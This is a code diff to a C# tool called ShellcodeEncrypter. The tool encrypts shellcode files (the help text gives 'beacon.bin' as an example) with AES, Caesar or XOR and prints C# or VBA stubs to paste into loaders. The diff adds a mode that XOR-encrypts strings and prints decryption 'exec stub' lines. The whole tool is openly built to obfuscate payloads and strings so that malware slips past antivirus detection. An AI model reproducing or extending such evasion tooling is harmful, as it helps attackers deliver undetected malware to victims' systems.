@@ -1,5 +1,6 @@
 ﻿using CommandLine;
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
@@ -15,7 +16,7 @@ namespace ShellcodeEncrypter
             [Option('i', "input", Required = true, HelpText = "Input file to be processed (e.g. beacon.bin).")]
             public string inputBin { get; set; }
 
-            [Option('m', "mode", Required = true, HelpText = "Encryption/encoding mode (aesCS,caesarCS,caesarVBA,xorCS)")]
+            [Option('m', "mode", Required = true, HelpText = "Encryption/encoding mode (aesCs,caesarCs,caesarVba,xorCs,xorCsString)")]
             public string encMode { get; set; }
 
             [Option('r', "resource", Required = false,Default = false, HelpText = "Output as an embeded resource file (default is copy and paste code)")]
@@ -28,44 +29,51 @@ namespace ShellcodeEncrypter
             Parser.Default.ParseArguments<Options>(args)
                 .WithParsed<Options>(o =>
                 {
-                    //ensure bin file exists
-                    if (!File.Exists(o.inputBin))
-                    {
-                        Console.WriteLine("[!] Error: input bin does not exist");
-                        return;
-                    }
-                    //Console.WriteLine("encMode=" + o.encMode + " | inputBin=" + o.inputBin);
-
-
-                    // read in bytes
                     Console.WriteLine("[>] Initializing...");
                     Console.WriteLine("[>] Mode: " + o.encMode);
-                    Console.WriteLine("[>] Reading bytes from: " +o.inputBin);
-                    byte[] buf = File.ReadAllBytes(o.inputBin);
 
-                    Console.WriteLine("[>] Bytes read: " + buf.Length);
-
-                    // encrypt
-                    if (o.encMode.Equals("aescs", StringComparison.OrdinalIgnoreCase))
+                    if (o.encMode.Equals("xorcsstring", StringComparison.OrdinalIgnoreCase))
                     {
-                        AesCsharp(buf, o.outAsResource);
-                    }
-                    else if (o.encMode.Equals("caesarvba", StringComparison.OrdinalIgnoreCase))
-                    {
-                        CaesarVBA(buf);
-                    }
-                    else if (o.encMode.Equals("caesarcs", StringComparison.OrdinalIgnoreCase))
-                    {
-                        CaesarCsharp(buf, o.outAsResource);
-                    }
-                    else if (o.encMode.Equals("xorcs", StringComparison.OrdinalIgnoreCase))
-                    {
-                        XORCsharp(buf, o.outAsResource);
-                    }
+                        Console.WriteLine("[>] Input mode: string");
+                        XorCsharpString(o.inputBin);
+                    } 
                     else
                     {
-                        Console.WriteLine("[!] error: unknown encryption mode");
+                        Console.WriteLine("[>] Input mode: bin");
+
+                        //ensure bin file exists
+                        if (!File.Exists(o.inputBin))
+                        {
+                            Console.WriteLine("[!] Error: input bin does not exist");
+                            return;
+                        }
+
+                        Console.WriteLine("[>] Reading bytes from: " + o.inputBin);
+                        byte[] buf = File.ReadAllBytes(o.inputBin);
+
+                        Console.WriteLine("[>] Bytes read: " + buf.Length);
+                        if (o.encMode.Equals("aescs", StringComparison.OrdinalIgnoreCase))
+                        {
+                            AesCsharp(buf, o.outAsResource);
+                        }
+                        else if (o.encMode.Equals("caesarvba", StringComparison.OrdinalIgnoreCase))
+                        {
+                            CaesarVBA(buf);
+                        }
+                        else if (o.encMode.Equals("caesarcs", StringComparison.OrdinalIgnoreCase))
+                        {
+                            CaesarCsharp(buf, o.outAsResource);
+                        }
+                        else if (o.encMode.Equals("xorcs", StringComparison.OrdinalIgnoreCase))
+                        {
+                            XORCsharp(buf, o.outAsResource);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] error: unknown encryption mode");
+                        }
                     }
+                    
                 });
 
             return;
@@ -102,6 +110,27 @@ namespace ShellcodeEncrypter
                 hex.AppendFormat("0x{0:x2}, ", b);
             }
             return hex.ToString().Remove(hex.ToString().Length - 2);
+        }
+        private static string ToHexString(byte[] data)
+        {
+            StringBuilder hex = new StringBuilder(data.Length * 2);
+            foreach (byte b in data)
+            {
+                //hex.AppendFormat("0x{0:x2}, ", b);
+                hex.AppendFormat("{0:x2}", b);
+            }
+            return hex.ToString();
+        }
+        private static string XOR(string input, string key)
+        {
+            var kL = key.Length;
+
+            StringBuilder output = new StringBuilder();
+            for (int i = 0; i < input.Length; i++)
+                output.Append((char)(input[i] ^ key[(i % key.Length)]));
+            String result = output.ToString();
+
+            return result;
         }
         /*
          * --- Csharp
@@ -181,6 +210,44 @@ namespace ShellcodeEncrypter
             Console.WriteLine("byte[] key = new byte[" + encryptor.Key.Length + "] {" + ToHex(encryptor.Key) + "};");
             Console.WriteLine("-----");
             Console.WriteLine("[>] Thanks to @xct_de");
+        }
+        private static void XorCsharpString(string strInput)
+        {
+            Console.WriteLine("[>] Encrypting string: " + strInput);
+
+            string[] pTextArr;
+
+            // parse input
+            if (strInput.Contains(","))
+            {
+                pTextArr = strInput.Split(",".ToCharArray());
+            }
+            else
+            {
+                List<string> list = new List<string>();
+                list.Add(strInput);
+                pTextArr = list.ToArray();
+            }
+
+            Console.WriteLine("[>] encrypting " + pTextArr.Length + " entries");
+
+            // generate a key
+            var key = RandString(28);
+
+            Console.WriteLine("[>] key: " + ToHex(Encoding.Default.GetBytes(key)));
+            Console.WriteLine("[>] exec stub:\n");
+
+            // process
+            foreach (string pText in pTextArr)
+            {
+                Console.WriteLine("//  " + pText);
+
+                string eText = XOR(pText, key);
+
+                string dText = XOR(eText, key);
+
+                Console.WriteLine("Deflate(FromHex(\"" + ToHexString(Encoding.Default.GetBytes(eText)) + "\"),FromHex(\"" + ToHexString(Encoding.Default.GetBytes(key)) + "\"));");
+            }
         }
         private static void CaesarCsharp(byte[] buf, bool asResource)
         {
